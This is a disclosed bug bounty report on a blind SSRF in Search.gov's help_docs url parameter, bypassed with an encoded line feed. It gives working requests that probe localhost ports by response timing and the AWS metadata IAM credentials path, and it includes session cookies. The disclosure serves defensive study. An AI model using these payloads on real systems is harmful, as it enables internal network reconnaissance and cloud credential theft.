# SSRF in Search.gov via ?url= parameter

## Report Details
- **Report ID**: 514224
- **URL**: https://hackerone.com/reports/514224
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-03-23T13:51:35.176Z
- **Disclosed**: 2019-08-26T19:03:05.410Z

## Reporter
- **Username**: niwasaki
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
# Summary:

`https://search.usa.gov/help_docs` endpoint is vulnerable to SSRF via `url` parameter. The parameter is protected but can be bypassed using LF (%0A).

# Steps To Reproduce:

1. Login to Search.gov and click `help manual`.
2. The following request was vulnerable.
  - Request

    ```
    GET /help_docs?url=https%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
    Host: search.usa.gov
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: ja,en-US;q=0.7,en;q=0.3
    Accept-Encoding: gzip, deflate, br
    Referer: https://search.usa.gov/account
    X-NewRelic-ID: VgYAV1BRCxABU1JUBAUCXlI=
    X-CSRF-Token: /2jDOc6aYEZA5VealIrF44qJZtY0iDiTsALu8HYA+OOIewuKHREwyh6M0wGa2WC9amTPX4vPMjj0YQIjys3nNA==
    X-Requested-With: XMLHttpRequest
    Connection: close
    Cookie: _ga=GA1.2.924676610.1553290937; _gid=GA1.2.1047460386.1553290937; _ga=GA1.3.924676610.1553290937; _gid=GA1.3.1047460386.1553290937; _session_id=a0d5ecbfa9404ea9ffad4cb3ea771dea; user_credentials=1055608db95b714d9ae2ef05a4e1b83aa138ad5fca67422f02ca795ec2a74179bb15c610dd33f5e6f200be0de0e812a8fe3d59a0027b290b5377ab2a65da1f19%3A%3A5992
    ```

3. If you insert `http://127.0.0.1:21/?%0A` before `url` parameter and send request, then response time is about 450ms. (Port is closed)
  - Request

    ```
    GET /help_docs?url=http://127.0.0.1:21/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
    (snip)
    ```
  - Response

    ```
    HTTP/1.1 200 OK
    (snip)
    {"body":"<div class='alert alert-error'>Unable to retrieve <a href='http://127.0.0.1:21/?\nhttps://search.gov/manual/account.html'>http://127.0.0.1:21/?\nhttps://search.gov/manual/account.html</a>.</div>"}
    ```

4. If you insert `http://127.0.0.1:22/?%0A` before `url` parameter and send request, then response time is about 10,468ms. (Port is open)
  - Request

    ```
    GET /help_docs?url=http://127.0.0.1:22/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
    (snip)
    ```
  - Response

    ```
    HTTP/1.1 200 OK
    (snip)
    {"body":"<div class='alert alert-error'>Unable to retrieve <a href='http://127.0.0.1:22/?\nhttps://search.gov/manual/account.html'>http://127.0.0.1:22/?\nhttps://search.gov/manual/account.html</a>.</div>"}
    ```

5. If you insert `http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0A` before `url` parameter, then response body is empty. (/security-credentials exists)
  - Request

    ```
    GET /help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
    (snip)
    ```
  - Response

    ```
    HTTP/1.1 200 OK
    (snip)
    {"body":""}
    ```

6. If you insert `http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0A` before `url` parameter, then response body is `Unable to retrieve` error. (/security-credentialx does not exists)
  - Request

    ```
    GET /help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
    (snip)
    ```
  - Response

    ```
    HTTP/1.1 200 OK
    (snip)
    {"body":"<div class='alert alert-error'>Unable to retrieve <a href='http://169.254.169.254/latest/meta-data/iam/security-credentialx/?\nhttps://search.gov/manual/account.html'>http://169.254.169.254/latest/meta-data/iam/security-credentialx/?\nhttps://search.gov/manual/account.html</a>.</div>"}
    ```

## Impact

Attacker can scan your local network, finding internal port, and internal web applications. This may help with mapping what the infrastructure looks like and can help plan exploiting other vulnerabilities.

## Attachments
No attachments
